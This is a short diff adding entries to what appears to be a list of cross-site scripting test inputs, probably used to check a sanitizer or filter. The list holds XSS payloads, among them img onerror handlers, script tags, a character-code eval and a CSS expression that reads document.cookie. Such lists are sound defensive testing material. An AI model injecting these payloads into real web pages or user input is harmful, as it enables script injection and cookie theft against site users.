@@ -17,6 +17,7 @@
 <img src='sampleimage' onerror="alert('hacked')" />
 <img src='nonexistant' onerror="alert('hacked')" />
 <img src /onerror=alert(1)>
+<img/src=x onError="'${x}';alert('HACKED');">
 <script>prompt("hacked")</script>
 <script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))</script>
 abc";alert("hacked");
@@ -27,3 +28,5 @@ abc';alert('hacked'); //
 ';alert('hacked');'
 "><script>alert('hacked')</script>
 #evul<script>alert('hacked')</script>
+<script>alert(document.domain)</script>
+<font style='color.expression(alert(document.cookie))'>
